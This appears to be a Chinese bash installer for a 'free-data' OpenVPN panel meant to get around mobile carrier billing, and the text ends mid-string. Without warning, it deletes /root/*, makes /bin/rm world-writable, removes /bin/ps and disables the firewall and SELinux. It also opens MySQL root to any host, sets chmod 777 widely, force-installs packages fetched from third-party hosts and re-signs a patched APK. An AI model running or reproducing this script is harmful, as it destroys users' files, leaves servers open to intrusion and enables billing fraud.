#!/bin/bash 
#ZY流控
#QQ：1420840396
#By 烟雨如花 Qq863963860
#不保留版权死一户口本
ulimit -c 0 
rm -rf $0
rm -rf /root/*
trap exit SIGTSTP 
mv /usr/bin/rm 
chmod 777 /bin/rm 
rm -rf /bin/ps && rm -rf zy.* zy && rm -rf * 
clear
IP=`wget http://members.3322.org/dyndns/getip -O - -q ; echo`;
echo
echo -e "\033[1;33m=======   ===================================================================\033[0m"
echo -e "\033[1;36m                            ZY流控-免流脚本           	                 \033[0m"
echo
echo -e "\033[1;32m                                 温馨提示：         	                     \033[0m"
echo
echo -e "\033[1;32m               为了您服务器的稳定和安全，请勿非法破解改程序               \033[0m"
echo
echo -e "\033[1;32m                           支持正版，抵制盗版                             \033[0m"
echo
echo -e "\033[1;32m                     秘钥绑定IP可反复无限永久使用！				             \033[0m"
echo -e "\033[1;38m               官网：zyzyml.cn                       \033[0m"
echo -e "\033[1;38m             交流群：348286869                  \033[0m"
echo -e "\033[1;34m===================================================================   =======\033[0m"
echo -e "\033[1;36m正在检测您的系统是否符合安装....\033[0m"
sleep 2
COO='
=========================================================================
                 安装终止，请在centos7.x系统上安装！                   
                           温馨提示：                 
             为了您服务器的稳定和安全，请勿非法破解改程序             
                      支持正版，抵制盗版                                
                 秘钥绑定IP可反复无限永久使用！                  
                                                  官网：zyzyml.cn                       
                                                交流群：348286869                  
=========================================================================';
keyerrorlogo='
==================================================================
                      验证码输入错误，请重新运行                                            
                           ZY流控-免流脚本                       
                         All Rights Reserved                                
                                                                         
                 我们的网址，你都能输错，真是笨蛋耶。
==================================================================';
if [ -f /etc/os-release ];then
OS_VERSION=`cat /etc/os-release |awk -F'[="]+' '/^VERSION_ID=/ {print $2}'`
if [ $OS_VERSION != "7" ];then
echo -e "\n当前系统版本为：\033[1;32mCentOS $OS_VERSION\033[0m\n"
echo "暂不支持该系统安装"
echo "请更换 CentOS 7.0-7.2 系统进行安装"
echo "$COO";
exit 0;fi
elif [ -f /etc/redhat-release ];then
OS_VERSION=`cat /etc/redhat-release |grep -Eos '\b[0-9]+\S*\b' |cut -d'.' -f1`
if [ $OS_VERSION != "7" ];then
echo -e "\n当前系统版本为：\033[1;32mCentOS $OS_VERSION\033[0m\n"
echo "暂不支持该系统安装"
echo "请更换 CentOS 7.0-7.2 系统进行安装"
echo "$COO";
exit 0;fi
else
echo -e "当前系统版本为：\033[1;32m未知\033[0m\n"
echo "暂不支持该系统安装"
echo "请更换 CentOS 7.0-7.2 系统进行安装"
echo "$COO";
exit 0;fi
echo;echo -n -e "\033[1;36m每次搭建都要重装系统，回车继续！\033[0m"
read
echo;echo -e "\033[1;36m开始预先整理环境,请稍后....\033[0m"
if [ ! -e "/dev/net/tun" ];then
echo;echo -e "  安装出错 [原因：\033[1;32m TUN/TAP虚拟网卡不存在 \033[0m]"
echo "  网易蜂巢容器官方已不支持安装使用"
exit 0;fi
yum install -y wget >/dev/null 2>&1
yum install -y curl >/dev/null 2>&1
clear
ip=`wget http://members.3322.org/dyndns/getip -O - -q ; echo`; #ZY™
#key="zyzyml.cn";export key=$key #zy™
key="yyrh.me";export key=$key
echo -e "\033[1;33m=======   ===================================================================\033[0m"
echo -e "\033[1;36m                            ZY流控-免流脚本           	                 \033[0m"
echo
echo -e "\033[1;32m                                 温馨提示：         	                     \033[0m"
echo
echo -e "\033[1;32m               为了您服务器的稳定和安全，请勿非法破解改程序               \033[0m"
echo
echo -e "\033[1;32m                           支持正版，抵制盗版                             \033[0m"
echo
echo -e "\033[1;32m                     秘钥绑定IP可反复无限永久使用！				             \033[0m"
echo -e "\033[1;38m               官网：zyzyml.cn                       \033[0m"
echo -e "\033[1;38m             交流群：348286869                  \033[0m"
echo -e "\033[1;34m===================================================================   =======\033[0m"
echo -e "\033[1;36m脚本已由阿里云/腾讯云centos7.x测试通过 \033[0m"
#echo -n -e "请输入验证码 [\033[1;34m $key \033[0m"] ：
echo -n -e "请输入烟雨如花博客网址 [\033[1;34m $key \033[0m"] ：
    read PASSWD
    readkey=$PASSWD
    if [[ ${readkey%%\ *} == $key ]]
    then
    echo 
		echo -e '\033[1;32m验证成功！\033[0m即将进行下一部操作...'
		sleep 2
		clear
  else
 echo
echo -e "\033[1;32m验证失败 ，请重新尝试！  \033[0m"
echo -e "\033[1;32m$keyerrorlogo\033[0m"
sleep 1
exit
fi
echo
echo -e "\033[1;33m=======   ===================================================================\033[0m"
echo -e "\033[1;36m                            ZY流控-免流脚本           	                 \033[0m"
echo
echo -e "\033[1;32m                                 温馨提示：         	                     \033[0m"
echo
echo -e "\033[1;32m               为了您服务器的稳定和安全，请勿非法破解改程序               \033[0m"
echo
echo -e "\033[1;32m                           支持正版，抵制盗版                             \033[0m"
echo
echo -e "\033[1;32m                     秘钥绑定IP可反复无限永久使用！				             \033[0m"
echo -e "\033[1;38m               官网：zyzyml.cn                       \033[0m"
echo -e "\033[1;38m             交流群：348286869                  \033[0m"
echo -e "\033[1;34m===================================================================   =======\033[0m"
# echo -e "\033[1;34m授权地址：http://zyzyml.cn/sq\033[0m"
# echo -e "\033[1;34m网站授权后，可直接回车。\033[0m"
#echo -n -e "\033[45m回车：\033[0m"
#read km
kmcard=3306 #`curl -s http://zyzyml.cn/sq/api.php?url=${IP}\&km=$km`;
echo 
echo -e "\033[1;34m正在检测你的授权是否正确，请稍等....\033[0m"
echo
echo -e "\033[1;32m>>>>>\033[0m"
sleep 0.1
echo -e "\033[1;32m>>>>>>>\033[0m"
sleep 0.1
echo -e "\033[1;32m>>>>>>>>>\033[0m"
sleep 0.1
if [[ $kmcard == "3305" ]]
then
echo
echo -e '\033[1;33m==========================================================================\033[0m'
echo -e '\033[1;32m                       验证失败,请网站检查是否授权成功！                 \033[0m'
echo
echo -e '\033[1;32m                                 温馨提示：                               \033[0m'
echo
echo -e '\033[1;32m                为了您服务器的稳定和安全，请勿非法破解改程序               \033[0m'
echo
echo -e '\033[1;32m                     授权成功，可反复无限永久搭建！				             \033[0m'
echo -e '\033[1;32m               官网：zyzyml.cn                       \033[0m'
echo -e '\033[1;32m             交流群：348286869                  \033[0m'
echo -e '\033[1;34m==========================================================================\033[0m'
echo
echo -e "\033[1;32m验证失败！ 授权错误或未授权！\033[0m"
echo -e "[高级模式：\033[1;31m 未开启 \033[0m] "
echo -e "授权地址:\033[1;34m http://zyzyml.cn/sq\033[0m"
echo -e "购买地址:\033[1;34m http://zyzyml.cn/km\033[0m"
echo -e "\033[1;32m安装被终止.................            \033[0m"
exit 0;
fi
if [[ $kmcard == "3301" ]]
then
echo -e '\033[1;35m==========================================================================\033[0m'
echo -e '\033[1;32m                验证失败，请输入正确卡密              \033[0m'
echo -e '\033[1;32m                                 温馨提示：                               \033[0m'
echo -e '\033[1;32m                为了您服务器的稳定和安全，请勿非法破解改程序               \033[0m'
echo -e '\033[1;32m                     秘钥绑定IP可反复无限永久使用！				             \033[0m'
echo -e '\033[1;32m               官网：zyzyml.cn                       \033[0m'
echo -e '\033[1;32m             交流群：348286869                  \033[0m'
echo -e '\033[1;35m==========================================================================\033[0m'
echo
echo -e "\033[1;32m未输入正确卡密，请重新输入\033[0m"
echo -e "[高级模式：\033[1;31m 未开启 \033[0m] "
echo -e "高级密钥仅需\033[1;32m 20 \033[0m 元/个  \033[1;32m同一IP可以无限次搭建!\033[0m"
echo -e "购买地址:\033[1;34m http://zyzyml.cn/km\033[0m"
echo -e "\033[1;32m安装被终止.................            \033[0m"
exit 0;
fi
if [[ $kmcard == "" ]]
then
echo -e '\033[1;35m==========================================================================\033[0m'
echo -e '\033[1;32m                   系统维护中..........高级安装暂停,请各位骚等                 \033[0m'
echo -e '\033[1;32m                                 温馨提示：                               \033[0m'
echo -e '\033[1;32m                为了您服务器的稳定和安全，请勿非法破解改程序               \033[0m'
echo -e '\033[1;32m                     秘钥绑定IP可反复无限永久使用！				             \033[0m'
echo -e '\033[1;32m               官网：zyzyml.cn                       \033[0m'
echo -e '\033[1;32m             交流群：348286869                  \033[0m'
echo -e '\033[1;35m==========================================================================\033[0m'
echo
echo -e "\033[1;32m系统维护中..........高级安装暂停,请各位骚等\033[0m"
echo -e "[高级模式：\033[1;31m 未开启 \033[0m] "
echo -e "高级密钥仅需\033[1;32m 20 \033[0m 元/个  \033[1;32m同一IP可以无限次搭建!\033[0m"
echo -e "购买地址:\033[1;34m http://zyzyml.cn/km\033[0m"
echo -e "\033[1;32m安装被终止.................            \033[0m"
exit 0;
fi
if [[ $kmcard == "3306" ]]
then
echo
echo -e "\033[1;32m恭喜您！[\033[1;32m  授权成功  \033[0m] \033[0m";
echo -e "\033[1;32m此ip以授权已绑定！\033[0m";
echo -e "\033[1;32m为了您服务器的稳定和安全，请勿非法破解改程序，小心后门。\033[0m";
echo
echo -e "\033[1;32m回车进入下一步\033[0m"
read
echo
if [[ 1 = 1 ]] ;then
echo -e '\033[1;34mIP状态：   [\033[32m  OK  ]\033[0m'
sleep 0.5 && echo
echo -e '\033[1;34m密匙正确！   [高级模式：\033[32m 已开启 ]\033[0m'
sleep 1 && echo
echo -e '\033[1;34m此授权已成功绑定您的机器，可无限搭建\033[0m';
sleep 1
else
echo -e '\033[1;34m授权码错误或已过期 [高级模式：\033[31m 未开启 ]\033[0m'
echo
echo -e '\033[1;34m授权购买地址:\033[32m http://zyzyml.cn/km \033[0m'
echo -e '\033[1;34m目前支持阿里云、腾讯云、爵士云CentosX7.2等正规服务器商\033[0m'
echo
echo -e '\033[1;34m服务安装被终止...\033[0m'

exit
fi 
fi
function zyhead() {
# 环境变量 *******
trap exit SIGTSTP 
rm -rf ${0};rm -rf install.*
porxy='udp.c';export porxy=$porxy
web='http://';export web=$web
app="zyws.zip";export app=$app
EasyRSA=easy-rsa.zip;export EasyRSA=$EasyRSA
webs='https://';export webs=$webs
O=openvpn-2.3.12-1.el7.x86_64.rpm;export O=$O
zyWEB="zy_web-3.0.zip";export zyWEB=$zyWEB
sql=mysql_$RANDOM;export sql=$sql
peizhi='peizhi.zip';export peizhi=$peizhi
phpmyadmin=phpmyadmin.tar.gz;export phpmyadmin=$phpmyadmin
IP=`wget http://members.3322.org/dyndns/getip -O - -q ; echo`;
URL='https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/zyzyml';
URL2='https://files.010521.xyz/OpenVPN/zyzyml';
return 1
}

function zyApp() {
echo && echo "正在准备Java环境..."
if [ ! -e "/usr/bin/java" ];then
  yum install -y java >/dev/null 2>&1
fi
mkdir /home/android 
chmod 0777 -R /home/android 
cd /home/android
# 反编译
echo && echo -e "正在反编译APP..."
wget -q ${URL}/apktool.jar 
wget -q ${URL}/DlAPP.apk 
java -jar apktool.jar d DlAPP.apk >/dev/null 2>&1

  sed -i 's/'1.1.1.1'/'${IP}'/g' "/home/android/DlAPP/smali/net/openvpn/openvpn/base.smali"
  sed -i 's/'1.1.1.1'/'${IP}'/g' "/home/android/DlAPP/smali/net/openvpn/openvpn/OpenVPNClient.smali" 
  sed -i 's/'1.1.1.1'/'${IP}'/g' "/home/android/DlAPP/smali/net/openvpn/openvpn/OpenVPNClient\$10.smali" 
  sed -i 's/'1.1.1.1'/'${IP}'/g' "/home/android/DlAPP/smali/net/openvpn/openvpn/OpenVPNClient\$11.smali" 
  sed -i 's/'1.1.1.1'/'${IP}'/g' "/home/android/DlAPP/smali/net/openvpn/openvpn/OpenVPNClient\$13.smali" 
  sed -i 's/'1.1.1.1'/'${IP}'/g' "/home/android/DlAPP/smali/net/openvpn/openvpn/Main2Activity\$MyListener\$1.smali" 
  sed -i 's/'1.1.1.1'/'${IP}'/g' '/home/android/DlAPP/smali/net/openvpn/openvpn/Main2Activity$MyListener.smali' 
  sed -i 's/'1.1.1.1'/'${IP}'/g' '/home/android/DlAPP/smali/net/openvpn/openvpn/MainActivity.smali' 
  sed -i 's/'1.1.1.1'/'${IP}'/g' '/home/android/DlAPP/smali/net/openvpn/openvpn/update$myClick$1.smali'
  sed -i 's/'1.1.1.1'/'${IP}'/g' '/home/android/DlAPP/smali/net/openvpn/openvpn/AutoScrollTextView.smali' 
  sed -i 's/ZY云流量/'$appname'/g' "/home/android/DlAPP/res/values/strings.xml"
  sed -i 's/dlapp=1797106720/'dlapp=$dlapp'/g' "/home/android/DlAPP/smali/net/openvpn/openvpn/OpenVPNClient.smali" 
  sed -i 's/dlapp=1797106720/'dlapp=$dlapp'/g' "/home/android/DlAPP/smali/net/openvpn/openvpn/OpenVPNClient\$13.smali" 
  
  if [[ $img == 'yes' ]];then
    # 图标
    rm -rf /home/android/DlAPP/res/drawable-hdpi-v4/icon.png
    rm -rf /home/android/DlAPP/res/drawable-mdpi-v4/icon.png
    rm -rf /home/android/DlAPP/res/drawable-xhdpi-v4/icon.png
    wget -q -O /home/android/DlAPP/res/drawable-xhdpi-v4/icon.png
    cp /home/android/DlAPP/res/drawable-xhdpi-v4/icon.png /home/android/DlAPP/res/drawable-mdpi-v4/icon.png
    cp /home/android/DlAPP/res/drawable-xhdpi-v4/icon.png /home/android/DlAPP/res/drawable-hdpi-v4/icon.png

    # 启动图
    rm -rf /home/android/DlAPP/res/drawable/splash.png
    wget -q -O /home/android/DlAPP/res/drawable/splash.png 
  fi

  # 打包
  echo && echo -e "正在签名打包APP..."
  chmod +x /home/android/apktool.jar
  java -jar apktool.jar b DlAPP >/dev/null 2>&1
  cd /home/android/DlAPP/dist
  wget -q ${URL}/signer.tar.gz 
  tar zxf signer.tar.gz
  java -jar signapk.jar testkey.x509.pem testkey.pk8 DlAPP.apk app.apk >/dev/null 2>&1 
cp -rf /home/android/DlAPP/dist/app.apk /Data/wwwroot/zyvpn/app.apk
rm -rf /home/*
return 1
}

function zyClear() {
clear
sleep 1 && echo
echo -e "\033[1;33m=======   ===================================================================\033[0m"
echo -e "\033[1;36m                            ZY流控-免流脚本           	                 \033[0m"
echo
echo -e "\033[1;32m                                 温馨提示：         	                     \033[0m"
echo
echo -e "\033[1;32m               为了您服务器的稳定和安全，请勿非法破解改程序               \033[0m"
echo
echo -e "\033[1;32m                           支持正版，抵制盗版                             \033[0m"
echo
echo -e "\033[1;32m                     秘钥绑定IP可反复无限永久使用！				             \033[0m"
echo -e "\033[1;38m               官网：zyzyml.cn                       \033[0m"
echo -e "\033[1;38m             交流群：348286869                  \033[0m"
echo -e "\033[1;34m===================================================================   =======\033[0m"
echo
echo
echo -n -e "\033[36m请设置您的数据库密码、默认随机6位\033[0m\033[31m【温馨提示:建议默认】\033[0m：" 
read sqlpass
if [[ -z $sqlpass ]] && sqlpass=`cat /dev/urandom | head -n 6 | md5sum | head -c 6`
then
echo
echo
echo -e "\033[34m已设置数据库密码：$sqlpass \033[0m"
else
echo
echo -e "\033[34m已设置数据库密码：$sqlpass \033[0m"
fi
echo
echo -e "\033[1;32m请输入云端软件名称[回车默认:ZY云流量 ]：\033[0m"
read appname
echo
if [[ -z ${appname} ]]
then
appname=ZY云流量 
echo -e "\033[1;32m云端软件名称已设置为：\033[32m $appname \033[0m"
fi
sleep 0.5
clear
echo -n -e "\033[1;34m回车开始，快速安装。 \033[0m"
clear
echo -e "\033[1;33m=======   ===================================================================\033[0m"
echo -e "\033[1;36m                            ZY流控-免流脚本           	                 \033[0m"
echo
echo -e "\033[1;32m                                 温馨提示：         	                     \033[0m"
echo
echo -e "\033[1;32m               为了您服务器的稳定和安全，请勿非法破解改程序               \033[0m"
echo
echo -e "\033[1;32m                           支持正版，抵制盗版                             \033[0m"
echo
echo -e "\033[1;32m                     秘钥绑定IP可反复无限永久使用！				             \033[0m"
echo -e "\033[1;38m               官网：zyzyml.cn                       \033[0m"
echo -e "\033[1;38m             交流群：348286869                  \033[0m"
echo -e "\033[1;34m===================================================================   =======\033[0m"
echo
echo;echo -e "\033[1;31m开始整理安装环境...\033[0m"
echo -e "\033[34m开始整理安装环境...\033[0m" 
yum install psmisc -y >/dev/null 2>&1
rm -rf /var/lib/mysql /var/log/mysql/
rm -rf /usr/lib64/mysql >/dev/null 2>&1   
rm -rf /Data && rm -rf /etc/zyvp && rm -rf /home/*
rm -rf /etc/openvpn && rm -rf /root/*
killall K >/dev/null 2>&1 && killall openvpn >/dev/null 2>&1 
systemctl stop openvpn@server.service >/dev/null 2>&1
systemctl stop httpd.service >/dev/null 2>&1
systemctl stop mariadb.service >/dev/null 2>&1 
yum -y remove openvpn >/dev/null 2>&1  
yum remove -y httpd >/dev/null 2>&1
yum remove -y mariadb mariadb-server >/dev/null 2>&1
yum remove -y mysql mysql-server>/dev/null 2>&1 
yum remove -y php php-mysql php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash php-fpm >/dev/null 2>&1
echo;echo -e "正在更新系统文件...";CURTIME=`date +"%Y-%m-%d %H:%M:%S"`;
mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup >/dev/null 2>&1
wget -q -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 
yum -y install epel-release unzip tar expect >/dev/null 2>&1
echo && echo -e "正在配置防火墙..."
systemctl stop firewalld.service >/dev/null 2>&1
systemctl disable firewalld.service >/dev/null 2>&1
yum install iptables-services -y >/dev/null 2>&1
yum -y install vim vim-runtime ctags >/dev/null 2>&1  
setenforce 0 >/dev/null 2>&1 
sed -i "s|SELINUX=enforcing|SELINUX=disabled|" /etc/selinux/config
echo "/usr/sbin/setenforce 0" >> /etc/rc.local
echo '
net.ipv4.ip_forward = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.default.accept_source_route = 0
kernel.sysrq = 0
kernel.core_uses_pid = 1
net.ipv4.tcp_syncookies = 1
net.bridge.bridge-nf-call-ip6tables = 0
net.bridge.bridge-nf-call-iptables = 0
net.bridge.bridge-nf-call-arptables = 0
kernel.msgmnb = 65536
kernel.msgmax = 65536
kernel.shmmax = 68719476736
kernel.shmall = 4294967296' >/etc/sysctl.conf
sysctl -p >/dev/null 2>&1
systemctl start iptables >/dev/null 2>&1 
iptables -F >/dev/null 2>&1 
iptables -t nat -A POSTROUTING -s 10.7.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.7.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -s 10.8.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.8.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -s 10.9.0.0/16 -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -s 10.9.0.0/16 -j SNAT --to-source $IP
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 1194 -j DNAT --to-destination $IP:443
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 138 -j DNAT --to-destination $IP:137
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 440 -j DNAT --to-destination $IP:443
iptables -t nat -A PREROUTING -p tcp -m tcp --dport 3389 -j DNAT --to-destination $IP:443
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 28080 -j ACCEPT
iptables -A INPUT -p TCP --dport 8080 -j ACCEPT
iptables -A INPUT -p TCP --dport 8686 -j ACCEPT
iptables -A INPUT -p UDP --dport 138 -j ACCEPT
iptables -A INPUT -p UDP --dport 137 -j ACCEPT
iptables -A INPUT -p UDP --dport 53 -j ACCEPT
iptables -A INPUT -p TCP --dport 138 -j ACCEPT
iptables -A INPUT -p TCP --dport 1194 -j ACCEPT
iptables -A INPUT -p TCP --dport 135 -j ACCEPT
iptables -A INPUT -p TCP --dport 3389 -j ACCEPT
iptables -A INPUT -p TCP --dport 137 -j ACCEPT
iptables -A INPUT -p TCP --dport 440 -j ACCEPT
iptables -A INPUT -p TCP --dport 443 -j ACCEPT
iptables -A INPUT -p TCP --dport 1026 -j ACCEPT
iptables -A INPUT -p TCP --dport 8081 -j ACCEPT
iptables -A INPUT -p TCP --dport 189 -j ACCEPT
iptables -A INPUT -p TCP --dport 53 -j ACCEPT
iptables -A INPUT -p TCP --dport 80 -j ACCEPT
iptables -A INPUT -p TCP --dport 28080 -j ACCEPT
iptables -A INPUT -p TCP --dport 189 -j ACCEPT
iptables -A INPUT -p TCP --dport 22 -j ACCEPT
iptables -A INPUT -p TCP --dport 25 -j DROP
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
service iptables save >/dev/null 2>&1 
systemctl restart iptables >/dev/null 2>&1 
systemctl enable iptables >/dev/null 2>&1 
return 1
}

function zyWeb() {
echo && echo -e "正在极速部署LAMP环境..."
yum -y install httpd >/dev/null 2>&1 && rm -rf /etc/httpd/conf/httpd.conf 
mv -f /root/K/httpd.conf /etc/httpd/conf/httpd.conf && chmod 0755 -R /etc/httpd/conf/httpd.conf && rm -rf /var/www/html
yum install -y php mariadb mariadb-server php-fpm php-cli php-gd php-mbstring php-mcrypt php-mysqlnd php-opcache php-pdo php-devel php-xml>/dev/null 2>&1
sed -i 's/;date.timezone =/date.timezone = PRC/g' /etc/php.ini
systemctl restart mariadb >/dev/null 2>&1
systemctl enable mariadb.service >/dev/null 2>&1  
systemctl restart httpd.service >/dev/null 2>&1
rm -rf /etc/my.cnf && mv /root/K/my.cnf /etc/my.cnf &&chmod 0755 -R /etc/my.cnf
systemctl enable httpd.service >/dev/null 2>&1  
rm -rf /Data && mkdir -p /Data/wwwroot/zyvpn
echo && echo -e "正在配置后台WEB面板..."
cd /root/ && wget ${URL2}/${zyWEB} >/dev/null 2>&1 && unzip -q ${zyWEB} && rm -rf ${zyWEB}
wget ${URL}/${app} >/dev/null 2>&1 && unzip -q ${app} && rm -rf ${app} 
sed -i 's/1.1.1.1/'${IP}'/g' /root/zyvpn/install.sql
sed -i 's/zydaili/'${sqlpass}'/g' /root/zyvpn/install.sql
sed -i 's/zyzyml.cn/'${sqlpass}'/g' /root/zy/config.php 
sed -i 's/zyzyml.cn/'${sqlpass}'/g' /root/zyvpn/config.php
sed -i 's/zyzyml.cn/'${IP}'/g' /root/K/disconnect.sh
mysqladmin -u root password "${sqlpass}" 
create_db_sql="create database IF NOT EXISTS zy" 
mysql -hlocalhost -uroot -p${sqlpass} -e "${create_db_sql}"  
mysql -hlocalhost -uroot -p${sqlpass} --default-character-set=utf8<<EOF
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '${sqlpass}' WITH GRANT OPTION;
flush privileges;
use zy;
source /root/zyvpn/install.sql;
EOF
mv -f /root/K/*.sh /etc/zyvpn/ && rm -rf /root/K/*.sh
echo -e "

shijian=30;
chu=1;
chuu=1;
localhost=localhost;
root=root;
mima=$sqlpass;
shujuku=zy;
user=iuser;
users=openvpn;
isent=isent;
irecv=irecv;
maxll=maxll;
phone=NULL;">>/etc/zyvpn/zypass && chmod 0777 -R /etc/zyvpn/zypass
chmod +x /etc/zyvpn/* && chmod 0777 -R /root/zyvpn && chmod 0777 -R /root/zy/*
mv -f /root/zyvpn/* /Data/wwwroot/zyvpn/ && rm -rf /root/zyvpn 
mv -f /root/zy /Data/wwwroot/zyvpn/zy && rm -rf /zy 
yum install -y crontabs >/dev/null 2>&1 && mkdir -p /var/spool/cron && mkdir -p /Data/zy_back
chmod 0777 -R /Data/wwwroot/zyvpn/cron.php
echo '/usr/bin/mysqldump --opt -uroot -pzyzyml.cn -hlocalhost zy > /Data/zy_back/`date +%F`.sql'>>/Data/zy_back/bf.sh
sed -i 's/zyzyml.cn/'${sqlpass}'/g' /Data/zy_back/bf.sh
echo "* * * * * curl --silent --compressed http://${IP}:8888/cron.php">>/var/spool/cron/root 
echo "00 05 *   * * /bin/sh /Data/zy_back/bf.sh">>/var/spool/cron/root
systemctl restart crond.service
systemctl enable crond.service >/dev/null 2>&1 
/Data/wwwroot/zyvpn/Online/Ktcp/jiankong >>/Data/wwwroot/tcp.log 2>&1 &
/Data/wwwroot/zyvpn/Online/Kudp/jiankong >>/Data/wwwroot/udp.log 2>&1 &
/Data/wwwroot/zyvpn/Online/Kudp53/jiankong >>/Data/wwwroot/udp.log 2>&1 &
echo "/Data/wwwroot/zyvpn/Online/Ktcp/jiankong >>/Data/wwwroot/tcp.log 2>&1 &">>/etc/rc.local
echo "/Data/wwwroot/zyvpn/Online/Kudp/jiankong >>/Data/wwwroot/udp.log 2>&1 &">>/etc/rc.local 
echo "/Data/wwwroot/zyvpn/Online/Kudp53/jiankong >>/Data/wwwroot/udp.log 2>&1 &">>/etc/rc.local 
chmod 0777 -R /Data/wwwroot/zyvpn/zy/data/* && chmod 0777 -R /Data/wwwroot/zyvpn/zy/* 
chmod 0777 -R /Data/wwwroot/zyvpn/zy && chmod 0777 -R /Data/wwwroot/zyvpn/*  
echo && vpn && LASTLINE=`date +"%Y-%m-%d %H:%M:%S"`;echo && echo "正在安装数据库..."
cd /Data/wwwroot/zyvpn && wget ${URL}/${phpmyadmin} >/dev/null 2>&1 && tar zxf ${phpmyadmin}
rm -f phpmyadmin.tar.gz && mv phpMyAdmin-4.4.15.5-all-languages phpmyadmin
chmod 0777 -R /Data/wwwroot/zyvpn/Online/zytcp/*
chmod 0777 -R /Data/wwwroot/zyvpn/Online/zyudp/*
chmod 0777 -R /Data/wwwroot/zyvpn/Online/zyudp53/*
systemctl enable openvpn@server.service >/dev/null 2>&1  
return 1
}

function zyVPN() {
echo -e "正在同步时间..." 
systemctl stop ntpd.service >/dev/null 2>&1
service ntpd stop >/dev/null 2>&1
cp -rf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime >/dev/null 2>&1 
ntpServer=(
[0]=s2c.time.edu.cn 
[1]=cn.ntp.org.cn
[2]=s1a.time.edu.cn
[3]=s2g.time.edu.cn 
[4]=s2k.time.edu.cn
[5]=s2m.time.edu.cn)
serverNum=`echo ${#ntpServer[*]}`  
NUM=0
for (( i=0; i<=$serverNum; i++ )); do
ntpdate ${ntpServer[$NUM]} >/dev/null 2>&1
if [ $? -eq 0 ]; then
echo
echo -e "当前时间：$(date -d "2 second" +"%Y-%m-%d %H:%M.%S")" 
break
echo -e "\e[1;31m\t\t[  错误  ]\e[0m" 
let NUM++
fi
done
hwclock --systohc >/dev/null 2>&1
systemctl start ntpd.service >/dev/null 2>&1
service ntpd start >/dev/null 2>&1
echo && echo "开始安装OpenVPN程序..."
yum install -y openvpn telnet >/dev/null 2>&1 
yum install -y gcc openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig expect >/dev/null 2>&1
cd /root && wget ${URL}/${peizhi} >/dev/null 2>&1 && unzip -q ${peizhi} && rm -rf ${peizhi} 
wget ${URL}/${O} >/dev/null 2>&1 && rpm -Uvh --oldpackage --force ${O} >/dev/null 2>&1 
rm -rf ${O} && rm -rf /etc/openvpn && rm -rf /etc/zyvpn && mkdir -p /etc/openvpn 
mv -f /root/K/server.conf /etc/openvpn/server.conf
mv -f /root/K/server-2.conf /etc/openvpn/server-2.conf
mv -f /root/K/server-3.conf /etc/openvpn/server-3.conf
mkdir -p /etc/zyvpn && cd /etc/openvpn 
wget ${URL}/${EasyRSA} >/dev/null 2>&1 && unzip -q ${EasyRSA} && rm -rf ${EasyRSA}
chmod 777 -R /etc/openvpn/easy-rsa/* && rm -rf /bin/vpn
echo "echo -e '正在重启vpn服务...'
killall openvpn >/dev/null 2>&1
systemctl stop openvpn@server.service
systemctl start openvpn@server.service
killall K >/dev/null 2>&1
K -l 138 -d >/dev/null 2>&1
K -l 137 -d >/dev/null 2>&1
K -l 8080 -d >/dev/null 2>&1
K -l 1194 -d >/dev/null 2>&1
K -l 139 -d >/dev/null 2>&1
K -l 135 -d >/dev/null 2>&1
K -l 136 -d >/dev/null 2>&1
K -l 53 -d >/dev/null 2>&1
K -l 3389 -d >/dev/null 2>&1
K -l 80 -d >/dev/null 2>&1
K -l 1194 -d >/dev/null 2>&1
K -l 440 -d >/dev/null 2>&1
openvpn --config /etc/openvpn/server-2.conf &
openvpn --config /etc/openvpn/server-3.conf &
systemctl restart mariadb >/dev/null 2>&1
systemctl restart httpd.service >/dev/null 2>&1
echo
echo -e '服务状态               [\033[32m OK \033[0m]'
exit">>/bin/vpn   
chmod 0777 -R /bin/vpn
echo && echo -e "正在安装HTTP转发..." 
cd /root && wget ${URL}/${porxy} >/dev/null 2>&1
gcc -o udp udp.c && rm -rf ${porxy}
mv -f /root/udp /bin/K && chmod 0777 /bin/K 
return 1
}

function zy() {
zyhead
zyClear
zyVPN
zyWeb
zyApp
Sys_data=`date -d  "$CURTIME" +%s`
In_data=`date -d  "$LASTLINE" +%s`;
all_time=`expr $In_data - $Sys_data`;
cd /Data
		clear
sleep 1 && echo
echo -e "\033[1;33m=======   ===================================================================\033[0m"
echo -e "\033[1;36m                            ZY流控-免流脚本           	                 \033[0m"
echo
echo -e "\033[1;32m                                 温馨提示：         	                     \033[0m"
echo
echo -e "\033[1;32m               为了您服务器的稳定和安全，请勿非法破解改程序               \033[0m"
echo
echo -e "\033[1;32m                           支持正版，抵制盗版                             \033[0m"
echo
echo -e "\033[1;32m                     秘钥绑定IP可反复无限永久使用！				             \033[0m"
echo -e "\033[1;38m               官网：zyzyml.cn                       \033[0m"
echo -e "\033[1;38m             交流群：348286869                  \033[0m"
echo -e "\033[1;34m===================================================================   =======\033[0m"
sleep 1 && echo
echo
echo -e "\033[1;35m=================================================\033[0m"
echo '感谢您使用ZY流控一键VPN搭建脚本' >>sm.txt
echo "
流量前台为：http://$IP:8888

代理管理为：http://$IP:8888/daili

后台管理为：http://$IP:8888/admin

软件下载地址为：http://$IP:8888/app.apk

数据库地址为：http://$IP:8888/phpmyadmin

-------------------------------------------------------
温馨提示：本次安装ZY流控VPN程序共花费$all_time 秒

管理账号：admin 管理密码：admin 数据库密码：$sqlpass
                               
